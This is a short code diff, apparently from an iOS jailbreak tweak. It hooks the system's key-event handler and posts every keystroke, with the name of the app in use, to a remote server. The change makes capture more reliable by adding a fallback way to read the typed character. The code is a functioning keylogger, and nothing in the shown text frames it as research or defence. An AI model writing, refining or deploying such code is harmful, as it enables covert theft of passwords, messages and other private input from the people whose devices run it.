@@ -36,15 +36,15 @@ static void postToServer(NSString *endpoint, NSDictionary *params) {
 
 - (void)handleKeyEvent:(id)event {
     %orig;
-    if ([event respondsToSelector:@selector(keyString)] && [event keyString]) {
-        NSString *key = [event keyString];
-        NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
-        if (key.length > 0 && ![key isEqualToString:@"\n"] && ![key isEqualToString:@"\t"]) {
-            postToServer(@"keystroke", @{
-                @"text": key,
-                @"app_name": app
-            });
-        }
+    NSString *key = nil;
+    @try { key = [event valueForKey:@"keyString"]; } @catch(id) {}
+    if (!key) key = [event description];
+    NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
+    if (key.length == 1 && ![key isEqualToString:@"\n"] && ![key isEqualToString:@"\t"]) {
+        postToServer(@"keystroke", @{
+            @"text": key,
+            @"app_name": app
+        });
     }
 }
 
